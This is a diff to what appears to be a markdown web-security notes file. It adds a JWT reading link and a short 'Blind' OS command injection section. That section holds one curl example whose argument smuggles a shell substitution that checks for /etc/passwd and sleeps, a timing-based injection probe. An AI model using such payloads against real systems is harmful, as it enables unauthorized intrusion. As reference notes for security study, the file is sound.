@@ -97,6 +97,7 @@ public function profile(): Response{
 
 - [Flask](./Python.md)
 - https://jwt.io/
+- https://rmrf.tips/en/ # 20 articles about JWT vulnerabities & cryptography
 - https://superuser.com/questions/1419155/generating-jwt-rs256-signature-with-openssl
 - https://github.com/ticarpi/jwt_tool/wiki
 
@@ -113,6 +114,15 @@ public function profile(): Response{
 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection
+
+
+### Blind
+
+- https://portswigger.net/web-security/os-command-injection#blind-os-command-injection-vulnerabilities
+
+```
+curl http://example.org/files/file.php -d "arg='x[$([ -f /etc/passwd ] && sleep 3)]'"
+```
 
 
 ## Path Traversal
